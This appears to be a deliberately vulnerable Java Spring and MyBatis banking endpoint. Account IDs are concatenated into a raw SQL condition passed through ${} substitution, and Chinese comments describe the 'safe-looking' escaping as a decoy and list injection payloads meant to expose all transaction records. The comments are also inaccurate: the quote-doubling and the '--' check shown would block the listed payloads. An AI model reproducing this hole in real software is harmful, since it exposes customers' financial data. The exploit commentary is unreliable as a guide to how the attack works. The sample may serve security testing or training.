package com.bank.financial.controller;

import com.bank.financial.service.AccountService;
import com.bank.financial.dto.AccountResponse;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

import java.util.List;

@RestController
@RequestMapping("/api/v1/accounts")
public class AccountController {
    @Autowired
    private AccountService accountService;

    @GetMapping("/transactions")
    @ResponseBody
    public List<AccountResponse> getAccountTransactions(@RequestParam String accountId) {
        // 看似安全的输入处理（双写单引号转义）
        String safeAccountId = accountId.replace("'", "''");
        return accountService.getTransactions(safeAccountId);
    }
}

package com.bank.financial.service;

import com.bank.financial.mapper.AccountMapper;
import com.bank.financial.dto.AccountResponse;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.util.List;

@Service
public class AccountService {
    @Autowired
    private AccountMapper accountMapper;

    public List<AccountResponse> getTransactions(String accountId) {
        // 混淆逻辑：先执行无效安全检查
        if (accountId.contains("--")) {
            throw new IllegalArgumentException("Invalid account ID");
        }
        
        // 构造包含拼接的危险查询
        String queryCondition = "account_id = '" + accountId + "'";
        return accountMapper.findTransactions(queryCondition);
    }
}

package com.bank.financial.mapper;

import com.bank.financial.dto.AccountResponse;
import org.apache.ibatis.annotations.Mapper;
import org.apache.ibatis.annotations.Select;

import java.util.List;

@Mapper
public interface AccountMapper {
    @Select({"<script>",
      "SELECT * FROM transactions WHERE ${queryCondition}",
      "</script>"})
    List<AccountResponse> findTransactions(String queryCondition);
}

// 漏洞利用示例：
// 正常请求: /api/v1/accounts/transactions?accountId=12345
// 恶意请求: /api/v1/accounts/transactions?accountId=12345' OR '1'='1
// 攻击者可通过多层编码绕过简单过滤，例如:
// accountId=12345'/**/OR/**/1=1--
// 最终生成SQL: SELECT * FROM transactions WHERE account_id = '12345'/**/OR/**/1=1--'
// 造成全表查询，暴露所有交易记录